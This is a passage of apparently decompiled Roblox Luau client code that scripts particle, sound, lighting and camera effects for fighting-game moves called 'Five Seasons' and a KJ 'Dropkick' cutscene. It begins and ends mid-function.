                                            u10:Create(v2921, TweenInfo.new(0.75, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                Size = _End22.Size,
                                            }):Play()
                                            task.wait(0.75)
                                            v2921:Destroy()
                                        end)
                                        task.spawn(function()
                                            local v2922 = u2912.Wind3:Clone()
                                            local _Start23 = v2922.Start
                                            local _End23 = v2922.End
                                            local v2925 = _Start23:Clone()

                                            v2925.Transparency = 0.75
                                            v2925.Name = 'ClonedMesh'
                                            v2925.Parent = u2912.CurrentTweens

                                            u10:Create(v2925, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                                CFrame = _End23.CFrame,
                                                Size = _End23.Size,
                                            }):Play()
                                            u10:Create(v2925, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Transparency = 1}):Play()
                                            task.wait(0.8)
                                            v2925:Destroy()
                                        end)
                                        task.spawn(function()
                                            local v2926 = u2912.Wind2:Clone()
                                            local _Start24 = v2926.Start
                                            local _End24 = v2926.End
                                            local v2929 = _Start24:Clone()

                                            v2929.Transparency = 0.8
                                            v2929.Name = 'ClonedMesh'
                                            v2929.Parent = u2912.CurrentTweens

                                            u10:Create(v2929, TweenInfo.new(0.55, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {
                                                CFrame = _End24.CFrame,
                                            }):Play()
                                            u10:Create(v2929, TweenInfo.new(0.55, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
                                                Size = _End24.Size,
                                                Transparency = 1,
                                            }):Play()
                                            task.wait(0.55)
                                            v2929:Destroy()
                                        end)

                                        local function v2936()
                                            task.spawn(function()
                                                local v2930 = u2912.WindDecal2:Clone()

                                                v2930:ScaleTo(Random.new():NextNumber(0.95, 2.35))

                                                local v2931 = Random.new():NextNumber(1, 2.75)
                                                local v2932 = math.random(0, 360)

                                                v2930:SetPrimaryPartCFrame(v2930.PrimaryPart.CFrame * CFrame.Angles(0, math.rad(v2932), 0))

                                                v2930.End.CFrame = v2930.End.CFrame * CFrame.Angles(0, math.rad(v2932), 0)

                                                local _Start25 = v2930.Start
                                                local _End25 = v2930.End
                                                local v2935 = _Start25:Clone()

                                                v2935.Decal.Transparency = Random.new():NextNumber(0.8, 0.93)
                                                v2935.Name = 'ClonedMesh'
                                                v2935.Parent = u2912.CurrentTweens

                                                u10:Create(v2935, TweenInfo.new(v2931, Enum.EasingStyle.Cubic, Enum.EasingDirection.Out), {
                                                    Size = _End25.Size,
                                                    CFrame = _End25.CFrame,
                                                }):Play()
                                                u10:Create(v2935.Mesh, TweenInfo.new(v2931, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), {
                                                    Scale = _End25.Mesh.Scale,
                                                }):Play()
                                                u10:Create(v2935.Decal, TweenInfo.new(v2931, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Transparency = 1}):Play()
                                                task.wait(4)
                                                v2935:Destroy()
                                            end)
                                        end

                                        local v2937 = u2912

                                        for _ = 1, 5 do
                                            spawn(v2936)
                                            task.wait(0.035)
                                        end

                                        task.wait(5)
                                        v2937:Destroy()
                                    end)

                                    local v2938 = _FiveSeasonsFX2.JumpFX:Clone()

                                    v2938:SetPrimaryPartCFrame(_Character8.HumanoidRootPart.CFrame)

                                    v2938.Parent = _Thrown6

                                    local v2939, v2940, v2941 = pairs(v2938.JumpFX:GetDescendants())

                                    while true do
                                        local v2942

                                        v2941, v2942 = v2939(v2940, v2941)

                                        if v2941 == nil then
                                            break
                                        end
                                        if v2942:IsA('ParticleEmitter') then
                                            v2942:Emit(v2942:GetAttribute('EmitCount'))
                                        end
                                    end

                                    v2938.JumpFX.EnabledP.Enabled = true

                                    local v2943 = _FiveSeasonsFX2.CharFX.BeamFX:Clone()

                                    v2943.Parent = _Character8.Torso

                                    local v2944, v2945, v2946 = pairs(v2943.Beams:GetDescendants())

                                    while true do
                                        local v2947

                                        v2946, v2947 = v2944(v2945, v2946)

                                        if v2946 == nil then
                                            break
                                        end
                                        if v2947:IsA('Beam') then
                                            v2947.Enabled = true
                                            v2947.TextureLength = v2947.TextureLength + Random.new():NextNumber(0.25, -0.25)
                                        end
                                    end

                                    task.wait(1.275)
                                    u10:Create(v2943, TweenInfo.new(0.85, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
                                        Position = Vector3.new(0, 0, 1, 0),
                                    }):Play()

                                    local v2948, v2949, v2950 = pairs(v2943.Beams:GetDescendants())

                                    while true do
                                        local v2951

                                        v2950, v2951 = v2948(v2949, v2950)

                                        if v2950 == nil then
                                            break
                                        end
                                        if v2951:IsA('Beam') then
                                            u10:Create(v2951, TweenInfo.new(0.9, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut), {
                                                Brightness = 0,
                                                Width0 = 0,
                                                Width1 = 0,
                                                CurveSize1 = 0,
                                                CurveSize0 = 0,
                                                TextureSpeed = v2951.TextureSpeed / 3,
                                            }):Play()
                                            u10:Create(v2951, TweenInfo.new(0.8, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Brightness = 0}):Play()
                                        end
                                    end

                                    local v2952, v2953, v2954 = pairs(v2943:GetDescendants())

                                    while true do
                                        local v2955

                                        v2954, v2955 = v2952(v2953, v2954)

                                        if v2954 == nil then
                                            break
                                        end
                                        if v2955:IsA('Attachment') and v2955.Name == 'tipat2' then
                                            u10:Create(v2955, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {
                                                Position = Vector3.new(0, 0, -1.5, 0),
                                            }):Play()
                                        end
                                    end

                                    task.wait(0.5)

                                    v2938.JumpFX.EnabledP.Enabled = false

                                    task.wait(4)
                                    v2943:Destroy()
                                    v2938:Destroy()
                                end)

                                local u2956 = _FiveSeasonsFX2.FXUi:Clone()
                                local _Vignette2 = u2956.Vignette
                                local u2958 = _FiveSeasonsFX2.HandFire:Clone()

                                task.delay(1.95, function()
                                    u2956.Parent = u2906.PlayerGui

                                    u10:Create(_Vignette2, TweenInfo.new(1.65, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut), {ImageTransparency = 0}):Play()
                                    u2958:SetPrimaryPartCFrame(_Character8['Left Arm'].CFrame)

                                    u2958.Parent = _Thrown6
                                    u2958.ArmWeld.Part0 = _Character8['Left Arm']
                                    u2958.ArmWeld.Part1 = u2958.Primary
                                end)

                                local u2959 = _FiveSeasonsFX2.ShadowDecal:Clone()
                                local u2960 = _FiveSeasonsFX2.ShadowDecal2:Clone()

                                u2959.Face = 'Bottom'
                                u2960.Face = 'Bottom'

                                task.delay(3.25, function()
                                    local v2961 = _FiveSeasonsFX2.CharFX.WindupGlow:Clone()

                                    v2961.Parent = _Character8['Left Arm']

                                    local v2962, v2963, v2964 = pairs(v2961:GetDescendants())

                                    while true do
                                        local v2965

                                        v2964, v2965 = v2962(v2963, v2964)

                                        if v2964 == nil then
                                            break
                                        end
                                        if v2965:IsA('ParticleEmitter') then
                                            v2965:Emit(v2965:GetAttribute('EmitCount'))
                                        end
                                    end

                                    u2959.Parent = _Character8['Left Arm']
                                    u2960.Parent = _Character8['Left Arm']

                                    u10:Create(u2960, TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {Transparency = 0.7}):Play()
                                    task.wait(0.2)
                                    u10:Create(u2959, TweenInfo.new(0.9, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {Transparency = 0.75}):Play()
                                    task.wait(8)
                                    u2959:Destroy()
                                    u2960:Destroy()
                                    v2961:Destroy()
                                end)
                                task.delay(3.545, function()
                                    local v2966, v2967, v2968 = pairs(u2958.FX:GetChildren())

                                    while true do
                                        local v2969

                                        v2968, v2969 = v2966(v2967, v2968)

                                        if v2968 == nil then
                                            break
                                        end
                                        if v2969:IsA('ParticleEmitter') then
                                            v2969.Enabled = false
                                        end
                                    end

                                    local v2970, v2971, v2972 = pairs(u2958.Emit:GetChildren())

                                    while true do
                                        local v2973

                                        v2972, v2973 = v2970(v2971, v2972)

                                        if v2972 == nil then
                                            break
                                        end
                                        if v2973:IsA('ParticleEmitter') then
                                            v2973:Emit(v2973:GetAttribute('EmitCount'))
                                        end
                                    end

                                    task.wait(1)
                                    u2958:Destroy()
                                end)

                                local u2974 = _FiveSeasonsFX2.CharFX.ArmFX:Clone()
                                local u2975 = _FiveSeasonsFX2.CharFX.ArmBurst:Clone()

                                task.delay(4.3, function()
                                    u2974.Parent = _Character8['Left Arm']
                                    u2975.Parent = _Character8['Left Arm']

                                    local v2976 = u2975
                                    local v2977, v2978, v2979 = pairs(v2976:GetDescendants())

                                    while true do
                                        local v2980

                                        v2979, v2980 = v2977(v2978, v2979)

                                        if v2979 == nil then
                                            break
                                        end
                                        if v2980:IsA('ParticleEmitter') then
                                            v2980:Emit(v2980:GetAttribute('EmitCount'))
                                        end
                                    end

                                    local v2981 = _FiveSeasonsFX2.FSRed:Clone()

                                    v2981.Parent = game.Lighting

                                    local v2982 = _FiveSeasonsFX2.FSWhite:Clone()

                                    v2982.Parent = game.Lighting

                                    local v2983 = _FiveSeasonsFX2.FSBlack:Clone()

                                    v2983.Parent = game.Lighting
                                    v2981.Enabled = true

                                    task.wait(0.035)

                                    v2981.Enabled = false
                                    v2982.Enabled = true

                                    task.wait(0.035)

                                    v2982.Enabled = false
                                    v2983.Enabled = true

                                    task.wait(0.035)

                                    v2983.Enabled = false

                                    v2981:Destroy()
                                    v2982:Destroy()
                                    v2983:Destroy()
                                    u10:Create(u2960, TweenInfo.new(0.35, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 1}):Play()
                                    u10:Create(u2959, TweenInfo.new(0.35, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {Transparency = 1}):Play()
                                    task.wait(6)
                                    u2974:Destroy()
                                end)
                                task.delay(5.7, function()
                                    local v2984 = u2974
                                    local v2985, v2986, v2987 = pairs(v2984:GetDescendants())

                                    while true do
                                        local v2988

                                        v2987, v2988 = v2985(v2986, v2987)

                                        if v2987 == nil then
                                            break
                                        end
                                        if v2988:IsA('ParticleEmitter') then
                                            v2988.Enabled = false
                                        end
                                    end
                                end)
                                task.delay(5.92, function()
                                    local v2989 = _FiveSeasonsFX2.CharFX.WindupSpark:Clone()

                                    v2989.Parent = _Character8['Left Arm']

                                    for _ = 1, 8 do
                                        v2989.WindupSpark:Emit(5)
                                        task.wait(0.035)
                                    end

                                    task.wait(1)
                                    v2989:Destroy()
                                end)

                                local u2990 = _FiveSeasonsFX2.CharFX.ArmEnabled:Clone()

                                task.delay(6.42, function()
                                    u2990.Parent = _Character8['Left Arm']

                                    local v2991 = _FiveSeasonsFX2.CharFX.EyeEmit:Clone()

                                    v2991.Parent = _Character8.Head

                                    local v2992, v2993, v2994 = pairs(v2991:GetDescendants())

                                    while true do
                                        local v2995

                                        v2994, v2995 = v2992(v2993, v2994)

                                        if v2994 == nil then
                                            break
                                        end
                                        if v2995:IsA('ParticleEmitter') then
                                            v2995:Emit(v2995:GetAttribute('EmitCount'))
                                        end
                                    end

                                    u2975.Parent = _Character8['Left Arm']

                                    local v2996 = u2975
                                    local v2997, v2998, v2999 = pairs(v2996:GetDescendants())

                                    while true do
                                        local v3000

                                        v2999, v3000 = v2997(v2998, v2999)

                                        if v2999 == nil then
                                            break
                                        end
                                        if v3000:IsA('ParticleEmitter') then
                                            v3000:Emit(v3000:GetAttribute('EmitCount'))
                                        end
                                    end

                                    local v3001 = _FiveSeasonsFX2.FSRed:Clone()

                                    v3001.Parent = game.Lighting

                                    local v3002 = _FiveSeasonsFX2.FSWhite:Clone()

                                    v3002.Parent = game.Lighting

                                    local v3003 = _FiveSeasonsFX2.FSBlack:Clone()

                                    v3003.Parent = game.Lighting
                                    u2956.Vignette.Visible = false

                                    local v3004, v3005, v3006 = pairs(u2906.PlayerGui:GetChildren())

                                    while true do
                                        local v3007

                                        v3006, v3007 = v3004(v3005, v3006)

                                        if v3006 == nil then
                                            break
                                        end
                                        if v3007.Name == 'FXUi' and v3007 ~= u2956 then
                                            v3007:Destroy()
                                        end
                                    end

                                    v3001.Enabled = true

                                    task.wait(0.035)

                                    v3001.Enabled = false
                                    v3002.Enabled = true

                                    task.wait(0.035)

                                    v3002.Enabled = false
                                    v3003.Enabled = true

                                    task.wait(0.035)

                                    v3003.Enabled = false

                                    v3001:Destroy()
                                    v3002:Destroy()
                                    v3003:Destroy()

                                    local v3008 = _FiveSeasonsFX2.FinalCC:Clone()

                                    v3008.Parent = game.Lighting

                                    u10:Create(v3008, TweenInfo.new(0.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
                                        TintColor = Color3.fromRGB(255, 255, 255),
                                        Brightness = 0,
                                        Contrast = 0,
                                    }):Play()
                                    task.wait(4)

                                    u2956.Vignette.Visible = false

                                    u2975:Destroy()
                                    u2990:Destroy()
                                    v3008:Destroy()
                                    v2991:Destroy()
                                end)
                                task.delay(8.25, function()
                                    if u2906.Character ~= _Character8 then
                                        u2956:Destroy()
                                    end

                                    u2990:Destroy()
                                end)
                                task.delay(0.9, function()
                                    shared.SetCore(false)

                                    local _ = _LocalPlayer3.Character.HumanoidRootPart.CFrame
                                    local _CurrentCamera10 = workspace.CurrentCamera

                                    _CurrentCamera10.CameraType = Enum.CameraType.Scriptable

                                    local u3010 = 0
                                    local u3011 = 0
                                    local u3012 = tick()
                                    local _PrimaryPart9 = _LocalPlayer3.Character.PrimaryPart
                                    local u3014 = nil
                                    local u3015 = nil

                                    _LocalPlayer3.Character.HumanoidRootPart.Anchored = true
                                    u2752 = u12.RenderStepped:Connect(function(p3016)
                                        local v3017 = p3016 * 60

                                        u3010 = u3010 + v3017

                                        local v3018 = tonumber((math.ceil(u3010)))

                                        if 340 <= v3018 and not u3014 then
                                            u3014 = u201().PrimaryPart.CFrame
                                        end

                                        local v3019 = u203[v3018]

                                        if _LocalPlayer3.Character.Parent then
                                            if _CurrentCamera10.CameraType ~= Enum.CameraType.Scriptable then
                                                _CurrentCamera10.CameraType = Enum.CameraType.Scriptable
                                            end

                                            u3011 = u3011 + v3017

                                            if v3019 and not u3014 then
                                                if tick() - u3012 <= 1 then
                                                    local v3020 = _CurrentCamera10
                                                    local _FieldOfView4 = _CurrentCamera10.FieldOfView
                                                    local _fov2 = v3019.fov
                                                    local v3023 = 1 - 9e-7 ^ p3016

                                                    v3020.FieldOfView = _FieldOfView4 + (_fov2 - _FieldOfView4) * v3023
                                                else
                                                    local v3024 = _CurrentCamera10
                                                    local _FieldOfView5 = _CurrentCamera10.FieldOfView
                                                    local _fov3 = v3019.fov
                                                    local v3027 = 1 - 9e-25 ^ p3016

                                                    v3024.FieldOfView = _FieldOfView5 + (_fov3 - _FieldOfView5) * v3027
                                                end
                                            end
                                            if v3019 then
                                                local _ = game.Workspace.CurrentCamera
                                                local _dededededededededededede4, v3029, v3030, v3031, v3032, v3033, v3034, v3035, v3036, v3037, v3038, v3039 = v3019.cframe:match('([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+)')
                                                local v3040 = CFrame.new(tonumber(_dededededededededededede4), tonumber(v3029), tonumber(v3030), tonumber(v3031), tonumber(v3032), tonumber(v3033), tonumber(v3034), tonumber(v3035), tonumber(v3036), tonumber(v3037), tonumber(v3038), tonumber(v3039))
                                                local v3041 = (u3014 or _PrimaryPart9.CFrame) * v3040
                                                local v3042 = u3015 and 10 <= (u3015.Position - v3041.Position).magnitude and true or nil

                                                u3015 = v3041

                                                if v3042 then
                                                    _CurrentCamera10.CFrame = v3041

                                                    return
                                                elseif tick() - u3012 <= 1 then
                                                    _CurrentCamera10.CFrame = _CurrentCamera10.CFrame:lerp(v3041, 1 - 9e-7 ^ p3016)
                                                else
                                                    _CurrentCamera10.CameraType = 'Scriptable'
                                                    _CurrentCamera10.CFrame = _CurrentCamera10.CFrame:lerp(v3041, 1 - 9e-25 ^ p3016)
                                                end
                                            end
                                        end
                                    end)
                                end)
                            end
                        end
                        local function u3202(p3044, p3045, p3046)
                            u122()

                            if p3045 then
                                shared.SetCore(false)

                                local _BodyVelocity14 = Instance.new('BodyVelocity')
                                local v3048 = Vector3.new()

                                _BodyVelocity14.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
                                _BodyVelocity14.Velocity = v3048
                                _BodyVelocity14.Parent = _LocalPlayer3.Character.HumanoidRootPart
                                _LocalPlayer3.Character.HumanoidRootPart.CFrame = p3046.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -15)

                                task.delay(15.6, function()
                                    for _ = 1, 100 do
                                        _LocalPlayer3.Character.HumanoidRootPart.Anchored = false

                                        _LocalPlayer3.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)

                                        if _BodyVelocity14 then
                                            if _BodyVelocity14.Parent then
                                                _BodyVelocity14:Destroy()
                                            end
                                        end
                                    end
                                end)
                                task.delay(16, function()
                                    _LocalPlayer3.Character.HumanoidRootPart.Anchored = false

                                    _LocalPlayer3.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                                end)
                            end

                            local v3049, _ = u391(game.ReplicatedStorage.Resources.KJEffects, {}, 15)
                            local v3050, v3051, v3052 = pairs(p3044:GetChildren())
                            local v3053 = p3044

                            while true do
                                local v3054, u3055 = v3050(v3051, v3052)

                                if v3054 == nil then
                                    break
                                end

                                v3052 = v3054

                                if u3055:IsA('BaseScript') then
                                    u3055.Parent = nil

                                    task.delay(2, function()
                                        u3055.Parent = p3044
                                    end)
                                end
                            end

                            _LocalPlayer3.Character.Humanoid.WalkSpeed = 25
                            _LocalPlayer3.Character.Humanoid.JumpPower = 50

                            local _Sound21 = Instance.new('Sound')

                            _Sound21.Volume = 6
                            _Sound21.Parent = workspace
                            _Sound21.SoundId = 'rbxassetid://17363374089'

                            _Sound21:Play()

                            local _Sound22 = Instance.new('Sound')

                            _Sound22.Volume = 5
                            _Sound22.Parent = workspace
                            _Sound22.SoundId = 'rbxassetid://17363377920'

                            _Sound22:Play()

                            local _Sound23 = Instance.new('Sound')

                            _Sound23.Volume = 2
                            _Sound23.Parent = workspace
                            _Sound23.SoundId = 'rbxassetid://17363383992'

                            _Sound23:Play()
                            task.delay(0.3, function()
                                local _Sound24 = Instance.new('Sound')

                                _Sound24.Volume = 1
                                _Sound24.Parent = workspace
                                _Sound24.SoundId = 'rbxassetid://17173354974'

                                _Sound24:Play()

                                local _Sound25 = Instance.new('Sound')

                                _Sound25.Volume = 1.5
                                _Sound25.Parent = workspace
                                _Sound25.SoundId = 'rbxassetid://17173355584'

                                _Sound25:Play()

                                local _Sound26 = Instance.new('Sound')

                                _Sound26.Volume = 3
                                _Sound26.Parent = u201().Head
                                _Sound26.SoundId = 'rbxassetid://17430017289'

                                _Sound26:Play()
                            end)
                            spawn(function()
                                wait(4.7)

                                local _Sound27 = Instance.new('Sound')

                                _Sound27.Volume = 2.5
                                _Sound27.SoundId = 'rbxassetid://17419337758'
                                _Sound27.Parent = workspace

                                _Sound27:Play()
                            end)

                            local _HumanoidRootPart8 = v3053.HumanoidRootPart
                            local _Parent2 = _HumanoidRootPart8.Parent.Parent

                            _HumanoidRootPart8.Parent.Parent = nil
                            p3044.Archivable = true

                            local u3065 = p3044:Clone()

                            if not u3065 then
                                repeat
                                    task.wait()

                                    u3065 = p3044:Clone()
                                until u3065
                            end

                            local v3066, v3067, v3068 = pairs(u3065:GetDescendants())

                            while true do
                                local v3069, v3070 = v3066(v3067, v3068)

                                if v3069 == nil then
                                    break
                                end

                                v3068 = v3069

                                if v3070:IsA('BodyMover') or v3070:IsA('Sound') then
                                    v3070:Destroy()
                                end
                            end

                            u3065.Parent = workspace.NoRaycast

                            local _Character9 = p3046.Character

                            if _Character9.HumanoidRootPart:FindFirstChild('grabweldforthe20dropkickthingyidk') then
                                _Character9.HumanoidRootPart.grabweldforthe20dropkickthingyidk:Destroy()
                            end

                            u3065.HumanoidRootPart.Anchored = false
                            u3065.HumanoidRootPart.CFrame = u113().CFrame * CFrame.new(0, 0, -10.15) * CFrame.Angles(0, math.rad(180), 0)

                            u60(u3065.HumanoidRootPart, _Character9.HumanoidRootPart, nil, CFrame.new(0, 0, -10.15) * CFrame.Angles(0, math.rad(180), 0))

                            local _Folder7 = Instance.new('Folder')

                            _Folder7.Name = 'NoRotate'
                            _Folder7.Parent = _Character9
                            _Character9.HumanoidRootPart.Anchored = true
                            _Character9.Humanoid.AutoRotate = false
                            u3065.Humanoid.AutoRotate = false

                            shared.SetCore(false)

                            if u3065 ~= p3044 then
                                local v3073, v3074, v3075 = pairs(_HumanoidRootPart8.Parent:GetDescendants())

                                while true do
                                    local v3076, u3077 = v3073(v3074, v3075)

                                    if v3076 == nil then
                                        break
                                    end

                                    v3075 = v3076

                                    if u3077:IsA('BasePart') or u3077:IsA('Decal') then
                                        local _Transparency3 = u3077.Transparency

                                        u3077.Transparency = 1

                                        task.delay(15.6, function()
                                            u3077.Transparency = _Transparency3
                                        end)
                                    elseif u3077:IsA('ParticleEmitter') or u3077:IsA('Trail') or (u3077:IsA('BillboardGui') or u3077:IsA('SurfaceGui')) then
                                        local _Enabled = u3077.Enabled

                                        u3077.Enabled = false

                                        task.delay(15.6, function()
                                            u3077.Enabled = _Enabled
                                        end)
                                    end
                                end
                            end

                            u706(u1077.Dropkick.Victim, true, u3065).Stopped:Connect(function()
                                _Character9.HumanoidRootPart.Anchored = false
                                _LocalPlayer3.Character.HumanoidRootPart.Anchored = false

                                u131()

                                _HumanoidRootPart8.Parent.Parent = workspace.Live
                            end)

                            local _Part9 = Instance.new('Part')

                            _Part9.Name = 'Cam'
                            _Part9.Transparency = 1
                            _Part9.Anchored = false
                            _Part9.CanCollide = false
                            _Part9.Parent = p3046.Character

                            local _Motor6D = Instance.new('Motor6D')

                            _Motor6D.Parent = p3046.Character.HumanoidRootPart
                            _Motor6D.Part1 = _Part9
                            _Motor6D.Part0 = p3046.Character.HumanoidRootPart

                            local u3082 = nil

                            task.delay(15.63, function()
                                shared.sfx({
                                    SoundId = 'rbxassetid://17420207822',
                                    Parent = _LocalPlayer3.Character.HumanoidRootPart,
                                    Volume = 6,
                                }):Play()
                                shared.sfx({
                                    SoundId = 'rbxassetid://17429102979',
                                    Parent = _LocalPlayer3.Character.HumanoidRootPart,
                                    Volume = 2,
                                }):Play()

                                if not p3045 then
                                    _LocalPlayer3.Character.HumanoidRootPart.CFrame = _LocalPlayer3.Character.HumanoidRootPart.CFrame * CFrame.new(0.33, -2.1, -178.11)
                                end

                                _HumanoidRootPart8.Parent.Parent = _Parent2
                                _LocalPlayer3.Character.HumanoidRootPart.Anchored = true

                                local v3083 = u4.Resources.KJEffects.DropkickExtra.lastimpact:Clone()

                                v3083.Parent = workspace
                                v3083.CFrame = _LocalPlayer3.Character.HumanoidRootPart.CFrame

                                u205:EmitParticlesAlt(v3083)
                                u3082:Disconnect()
                                _Part9:Destroy()
                                _Motor6D:Destroy()
                            end)

                            local _CurrentCamera11 = workspace.CurrentCamera

                            _CurrentCamera11.CameraType = Enum.CameraType.Scriptable

                            local u3085 = 0
                            local u3086 = 0
                            local u3087 = tick()

                            u3082 = u12.RenderStepped:Connect(function(p3088)
                                local v3089 = p3088 * 60

                                u3085 = u3085 + v3089

                                local v3090 = tonumber((math.ceil(u3085)))
                                local v3091 = u189[v3090 >= 922 and 2000000000 or v3090]

                                if v3091 and _LocalPlayer3.Character.Parent then
                                    if _CurrentCamera11.CameraType ~= Enum.CameraType.Scriptable then
                                        _CurrentCamera11.CameraType = Enum.CameraType.Scriptable
                                    end

                                    u3086 = u3086 + v3089

                                    if v3091 then
                                        if tick() - u3087 <= 0.5 then
                                            local v3092 = _CurrentCamera11
                                            local _FieldOfView6 = _CurrentCamera11.FieldOfView

                                            v3092.FieldOfView = _FieldOfView6 + (v3091.fov - _FieldOfView6) * 0.25
                                        else
                                            _CurrentCamera11.FieldOfView = v3091.fov
                                        end
                                    end
                                end
                            end)

                            task.spawn(function()
                                local v3094 = tick()

                                repeat
                                    task.wait()

                                    workspace.CurrentCamera.CameraType = 'Scriptable'
                                    workspace.CurrentCamera.CFrame = _Part9.CFrame
                                until tick() - v3094 >= 15.6

                                workspace.CurrentCamera.CameraType = 'Custom'

                                shared.SetCore(true)
                            end)
                            u706(u1077.Dropkick.Attacker, true, p3046).Stopped:Connect(function()
                                _Character9.HumanoidRootPart.Anchored = false
                                _LocalPlayer3.Character.HumanoidRootPart.Anchored = false

                                u131()
                            end)
                            task.delay(0.3, function()
                                local _Torso3 = u3065.Torso
                                local _HumanoidRootPart9 = u3065.HumanoidRootPart
                                local v3097 = game.ReplicatedStorage.Resources.KJEffects.DropkickExtra.firstHit:Clone()

                                v3097.Position = _Torso3.Position
                                v3097.Anchored = true
                                v3097.CFrame = _HumanoidRootPart9.CFrame
                                v3097.Parent = workspace.Thrown

                                local v3098, v3099, v3100 = pairs(v3097:GetDescendants())

                                while true do
                                    local v3101

                                    v3100, v3101 = v3098(v3099, v3100)

                                    if v3100 == nil then
                                        break
                                    end
                                    if v3101:IsA('ParticleEmitter') then
                                        v3101:Emit(v3101:GetAttribute('EmitCount'))
                                    end
                                end

                                task.delay(3, v3097.Destroy, v3097)
                            end)

                            local _CFrame15 = _Character9.HumanoidRootPart.CFrame
                            local _KJEffects3 = game.ReplicatedStorage.Resources.KJEffects

                            local function u3105(p3104)
                                return p3104 ^ 6
                            end

                            local u3106 = _KJEffects3.ImpactFloorBeams:Clone()

                            u3106.CFrame = _CFrame15 * CFrame.new(-0.969, -2.5, 5.084)
                            u3106.Parent = workspace.Thrown

                            local v3107 = v3049.speedlines:Clone()

                            v3107.CFrame = _CFrame15 * CFrame.new(-4.55, 11.47, 1.5)

                            if true then
                                v3107.Parent = workspace.Thrown
                            end

                            u205:EnabledAllVisuals(v3107)

                            local u3108 = v3107

                            task.delay(2.5, function()
                                local v3109 = u3108
                                local v3110, v3111, v3112 = pairs(v3109:GetChildren())

                                while true do
                                    local v3113

                                    v3112, v3113 = v3110(v3111, v3112)

                                    if v3112 == nil then
                                        break
                                    end

                                    u10:Create(v3113, TweenInfo.new(0.767, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {Rate = 0}):Play()
                                end
                            end)
                            task.delay(4.7, function()
                                u3106.floortradmillthin.hellooooo.TextureSpeed = -9
                                u3106.floortradmillthin.byeeeee.TextureSpeed = -4

                                u10:Create(u3106.floortradmillthin.byeeeee, TweenInfo.new(1.267, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                    TextureSpeed = -0.2,
                                }):Play()
                                u10:Create(u3106.floortradmillthin.hellooooo, TweenInfo.new(1.267, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
                                    TextureSpeed = -0.2,
                                }):Play()
                                u205:UnixConnection2(4.95, function(p3114)
                                    local v3115 = u205:Lerp(0, 1, (u10:GetValue(p3114, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)))

                                    u3106.floortradmillthin.byeeeee.Transparency = NumberSequence.new(v3115)
                                    u3106.floortradmillthin.hellooooo.Transparency = NumberSequence.new(v3115)
                                end)
                                u205:UnixConnection2(7.05, function(p3116)
                                    local v3117 = u205:Lerp(0.3, 1, (u10:GetValue(p3116, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)))

                                    u3106.windone['12893198328'].Transparency = NumberSequence.new(v3117)
                                    u3106.windone11['12718273187'].Transparency = NumberSequence.new(v3117)
                                end)
                                u205:UnixConnection2(2.684, function(p3118)
                                    local v3119 = u205:Lerp(7, 0.2, (u3105(p3118)))

                                    u3106.windone['12893198328'].TextureSpeed = v3119
                                    u3106.windone11['12718273187'].TextureSpeed = v3119
                                end)
                                u6:AddItem(u3106, 10)
                            end)
                            task.delay(1.4, function()
                                local _Torso4 = u3065.Torso
                                local _HumanoidRootPart10 = u3065.HumanoidRootPart

                                local function v3128()
                                    local v3122 = workspace:Raycast(_Torso4.Position, Vector3.new(0, -10, 0), u25)

                                    if v3122 then
                                        local v3123 = _KJEffects3.DropkickExtra.slam:Clone()

                                        v3123.CFrame = CFrame.lookAt(v3122.Position, v3122.Position + v3122.Normal)
                                        v3123.Parent = workspace.Thrown

                                        local v3124, v3125, v3126 = pairs(v3123:GetDescendants())

                                        while true do
                                            local v3127

                                            v3126, v3127 = v3124(v3125, v3126)

                                            if v3126 == nil then
                                                break
                                            end
                                            if v3127:IsA('ParticleEmitter') then
                                                if v3127:GetAttribute('ChangeColor') then
                                                    v3127.Color = ColorSequence.new(v3122.Instance.Color)
                                                end

                                                v3127:Emit(v3127:GetAttribute('EmitCount'))
                                            end
                                        end

                                        task.delay(2, v3123.Destroy, v3123)
                                    end
                                end

                                v3128()
                                task.wait(0.6)
                                v3128()
                                task.wait(0.55)
                                v3128()
                                task.wait(0.58)

                                local v3129 = _KJEffects3.DropkickExtra.drag:Clone()

                                v3129.Parent = workspace.Thrown

                                local v3130 = workspace:Raycast(_Torso4.Position, Vector3.new(0, -10, 0, 0), u25)

                                if v3130 then
                                    local v3131, v3132, v3133 = pairs(v3129:GetDescendants())

                                    while true do
                                        local v3134

                                        v3133, v3134 = v3131(v3132, v3133)

                                        if v3133 == nil then
                                            break
                                        end
                                        if v3134:IsA('ParticleEmitter') and v3134:GetAttribute('ChangeColor') then
                                            v3134.Color = ColorSequence.new(v3130.Instance.Color)
                                        end
                                    end
                                end

                                local v3135 = os.clock()

                                repeat
                                    task.wait(0.03333333333333333)

